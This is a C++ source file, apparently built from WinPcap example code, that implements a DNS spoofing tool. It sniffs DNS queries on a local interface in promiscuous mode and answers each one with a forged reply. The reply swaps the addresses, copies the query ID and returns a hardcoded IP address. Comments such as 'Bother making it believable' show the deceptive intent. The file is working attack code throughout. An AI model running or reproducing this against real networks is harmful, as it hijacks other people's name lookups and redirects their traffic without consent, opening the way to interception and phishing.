// DNSmanip.cpp : Defines the entry point for the console application.
//
/*
* Copyright (c) 1999 - 2005 NetGroup, Politecnico di Torino (Italy)
* Copyright (c) 2005 - 2006 CACE Technologies, Davis (California)
* All rights reserved.
*
* This program is a modified version of code examples found at http://www.winpcap.org/docs/docs_412/html/main.html
*/

#include "stdafx.h"
#include <cstdio>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>

#include <pcap.h>
#include "networkstructures.h"


#define LINE_LEN 32

using namespace std;

int poll_link(int linkType, pcap_t* connection);
int createDNSPacket(u_char start[], u_char spoof[]);

int main()
{
	pcap_t *fp;
	pcap_if_t *alldevs, *d;
	char errbuf[512];
	int i = 0, dNum;
	u_int netmask;
	struct bpf_program fcode; // compiled filter
	int linkType; // Ethernet, WiFi, etc
	
	/*string URL = "";

	cout << "Enter webpage to try and redirect to: " << endl;
	getline(cin, URL);
	*/
	cout << "Showing all available devices, select wanted interface: "<< endl;

	// Get devices
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf))
	{
		cout << "ERROR RETRIEVING DEVICES " << endl << errbuf << endl;
		return -1;
	}

	// Print devices
	for (d = alldevs; d; d = d->next)
	{
		cerr << ++i << " " << d->name << endl;
		cerr << (d->description ? d->description : "No description available") << endl;
	}

	if (i == 0)
	{
		cerr << "No devices found, exiting..." << endl;
		return -1;
	}

	// Let user choose device
	cout << "Select device number" << endl;
	cin >> dNum;

	if (dNum < 1 || dNum > i)
	{
		cerr << "Device number out of range, exiting..." << endl;
		pcap_freealldevs(alldevs);
	}

	// Let d point to selected device
	for (d = alldevs, i = 0; i < dNum - 1; d = d->next, i++);

	// Open device
	if ((fp = pcap_open(d->name,
		                65532,
		                PCAP_OPENFLAG_PROMISCUOUS,
		                1,
		                NULL,
		                errbuf)
		                ) == NULL)
	{
		cerr << "ERROR OPENING ADAPTER, EXITING..." << endl;
		pcap_freealldevs(alldevs);
		return -1;
	}

	// Determine what type of physical link is used
	linkType = pcap_datalink(fp);
	if (linkType != DLT_EN10MB && linkType != DLT_IEEE802_11)
	{
		cout << "UNSUPPORTED DATALINK TYPE DETECTED, EXITING..." << endl;
		pcap_freealldevs(alldevs);
		return -1;
	}
		
	if (d->addresses != NULL)
	{
		netmask = ((struct sockaddr_in *) (d->addresses->netmask))->sin_addr.S_un.S_addr;
	} 
	else
	{
		netmask = 0xffffff;
	}

	if (pcap_compile(fp, &fcode, "ip and udp", 1, netmask) < 0)
	{
		cerr << "ERROR COMPILING FILTER, EXTITING..." << endl;
		pcap_freealldevs(alldevs);
		return -1;
	}

	if (pcap_setfilter(fp, &fcode) < 0)
	{
		cerr << "ERROR APPLYING FILTER, EXITING..." << endl;
		pcap_freealldevs(alldevs);
		return -1;
	}

	// Not needed anymore
	pcap_freealldevs(alldevs); 

	// Listen for packets
	return poll_link(linkType, fp);
}

int poll_link(int linkType, pcap_t* connection)
{
	struct pcap_pkthdr *header;
	const u_char *pkt_data;
	int res;
	ip_header *ih = 0;
	udp_header *uh;
	dns_header *dh;
	u_int ip_len;
	u_short sport, dport;
	u_char packet[150];

	while ((res = pcap_next_ex(connection, &header, &pkt_data)) >= 0)
	{
		// Timeout occured
		if (res == 0)
			continue;

		
		ih = (ip_header*)(pkt_data + 14);
		ip_len = (ih->ver_ihl & 0xf) * 4;
		
		uh = (udp_header *)((u_char *)ih + ip_len);
		dport = ntohs(uh->dport);
		if (dport != 53) // NOT DNS REQUEST!
			continue;
			
		if (pcap_sendpacket(connection, packet, createDNSPacket(packet, (u_char *)pkt_data)) != 0)
		{
			cerr << "ERROR SENDING PACKET, EXITING..." << endl;
			return -1;
		}

		cout << "packet sent..." << endl;
	}
	return 0;
}

int createDNSPacket(u_char start[], u_char spoof[]) {
	ip_header *iph, *iphs;
	udp_header *udph, *udphs;
	dns_header *dnsh, *dnshs;

	// First 14 bytes are datalink because Ethernet and IEE802.11 is guaranteed
	// Intercepted message is Host->Gateway, sent message should be Gateway->Host
	for (int i = 0; i < 6; i++)
	{
		*(start+i) = *(spoof + i + 6);
		*(start + 6 + i) = *(spoof + i);
	}
	// IPv4
	*(start + 12) = *(spoof + 12);
	*(start + 13) = *(spoof + 13);

	// Create ip header
	iph = (ip_header *)(start + 14);
	iphs = (ip_header *)(spoof + 14);

	// ver 0100 ipv4 and header length 0101 (20 bytes)
	iph->ver_ihl = 0x45;
	// Tos whatever
	iph->tos = 0;
	// Identification whatever, not using fragmentation
	iph->identification = 0x4885;
	// Not using fragmentation
	iph->flags_fo = 0;
	// Bother making it believable
	iph->ttl = 0x40;
	// UDP
	iph->proto = 0x11;
	// Reverse addresses
	iph->saddr = iphs->daddr;
	iph->daddr = iphs->saddr;

	// Create udp header
	udph = (udp_header *)((u_char *)iph + ((iph->ver_ihl & 0x0f) * 4)); // 0f because endianess
	udphs = (udp_header *)((u_char *)iphs + ((iphs->ver_ihl & 0x0f) * 4));
	
	udph->sport = udphs->dport;
	udph->dport = udphs->sport;
	udph->crc = 0;

	// Create DNS header
	dnsh = (dns_header *)((u_char *)udph + 8);
	dnshs = (dns_header *)((u_char *)udphs + 8);
	dnsh->id = dnshs->id;
	dnsh->isResponse = 1;
	dnsh->opcode = dnshs->opcode;
	dnsh->authorative = 0;
	dnsh->truncation = 0;
	dnsh->recursionDesired = 1; // should be copied
	dnsh->RecursionAvailable = 1;
	dnsh->Reserved = 0;
	dnsh->AuthenticatedData = 0;
	dnsh->CheckingDisabled = 0;
	dnsh->responseCode = 0;
	dnsh->QuestionCount = dnshs->QuestionCount;
	dnsh->AnswerCount = ntohs(1);
	dnsh->NameServerCount = 0;
	dnsh->AdditionalCount = 0;

	// Create DNS data
	// Pointers to query
	u_char *pp = (u_char *)dnsh + 12;
	u_char *ps = (u_char *)dnshs + 12;
	// Copy query
	while (0 != *ps)
	{
		*pp = *ps;
		pp++;
		ps++;
	}
	// Write zero octet and QTYPE+QCLASS
	for (int i = 0; i < 5; i++)
	{
		*pp = *ps;
		pp++;
		ps++;
	}
	// Write custom answer
	// Domain name
	*pp++ = 0xC0; // pointer to domain name, first two bits are always 1
	*pp++ = 0x0C; // ---------------------- || -------------------------

	// Type
	*pp++ = 0x00;
	*pp++ = 0x01;

	// Class
	*pp++ = 0x00;
	*pp++ = 0x01;

	// TTL Increase for more fuckery
	*pp++ = 0x00;
	*pp++ = 0x00;
	*pp++ = 0x00;
	*pp++ = 0x8c;

	// Data length
	*pp++ = 0x00;
	*pp++ = 0x04;

	// IP-address
	*pp++ = 149;
	*pp++ = 202;
	*pp++ = 176;
	*pp++ = 202;

	// lengths
	iph->tlen = ntohs(pp - (u_char*)iph);
	udph->len = ntohs(pp - (u_char*)udph);

	// Validation disabled...
	iph->crc = 0;
	/*u_int checksum = 0;
	for (u_short *p = (u_short*)iph, i = 0; i < 10; i++, p++)
		checksum += ntohs(*p);
	while (checksum > 0xFFFF)
		checksum = (checksum & 0xF000) + (checksum & 0x0FFF);
	checksum = ~checksum;
	iph->crc = ntohs(checksum & 0xFFFF);
	*/
	return (pp - start);
}

